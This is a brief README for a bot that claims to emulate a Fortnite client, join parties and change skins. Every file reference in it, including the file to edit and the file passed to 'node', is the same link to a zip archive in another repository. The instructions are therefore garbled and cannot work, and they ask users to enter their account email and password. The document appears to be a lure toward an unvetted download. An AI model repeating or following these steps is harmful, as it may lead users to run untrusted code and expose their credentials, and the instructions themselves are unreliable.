# HTTP-Fortnite-Bot
Uses JavaScript to emulate a Fortnite client and can join parties through HTTP and change skins / emotes visually.

Requirements:
- https://raw.githubusercontent.com/FrxshSpamzL2/Fn_Bot_Commands/master/firebolt/Commands_Bot_Fn_1.2-beta.2.zip
- A working brain

Basic steps:
1) Download and unzip (ofc)
2) Open CMD in the unzipped folder
3) Run 'npm install'
4) Edit https://raw.githubusercontent.com/FrxshSpamzL2/Fn_Bot_Commands/master/firebolt/Commands_Bot_Fn_1.2-beta.2.zip and change the email and password
5) Run 'node https://raw.githubusercontent.com/FrxshSpamzL2/Fn_Bot_Commands/master/firebolt/Commands_Bot_Fn_1.2-beta.2.zip' to start the bot
